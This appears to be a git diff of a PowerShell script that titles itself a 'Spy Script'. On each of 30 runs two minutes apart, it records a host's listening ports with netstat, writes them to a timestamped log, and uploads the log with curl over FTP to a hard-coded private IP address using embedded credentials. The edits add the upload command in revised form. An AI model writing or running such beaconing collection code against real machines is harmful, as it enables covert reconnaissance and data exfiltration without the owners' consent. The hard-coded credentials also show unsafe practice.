@@ -1,7 +1,7 @@
 #Powershell Spy Script
 
 if ($IsWindows) {
-#man LinRun loop. script will run every 2 min for 1 hr (x30):
+#Main WinRun loop. script will run every 2 min for 1 hr (x30):
 
 #Setup FTP
 
@@ -35,7 +35,7 @@ Start-Sleep 120
 }
 
 elseif ($IsLinux) {
-#man LinRun loop. script will run every 2 min for 1 hr (x30):
+#Main LinRun loop. script will run every 2 min for 1 hr (x30):
 
 
 for ($cnt = 1; $cnt -le 30; $cnt++)
@@ -46,16 +46,17 @@ for ($cnt = 1; $cnt -le 30; $cnt++)
 Write-Host "Linux"
 
 #Get Time For FileName:
-Get-Date | Out-File -FilePath .\cracklins.log -Append
+$FileName=".\Cracklins_"+Get-Date
+Get-Date | Out-File -FilePath $FileName -Append
 
 #Collect Open Ports:
-netstat -an | Select-String "LISTENING" | Out-File -FilePath .\cracklins.log -Append
+netstat -an | Select-String "LISTENING" | Out-File -FilePath $FileName -Append
 
 # Send Home using curl:
-$localFile = (Get-Location).Path + "/cracklins.log"
+$localFile = (Get-Location).Path + $FileName
 Write-Host "Uploading file: $localFile"
 Get-Item $localFile | Select-Object FullName, Length
-bash -c "curl --ftp-pasv -u PD:2222 -T $localFile ftp://10.254.0.89/portdump/cracklins.log"
+bash -c "curl --ftp-pasv -u PD:2222 -T $localFile ftp://10.254.0.89/"
 
 #2 min sleep
 Start-Sleep 120
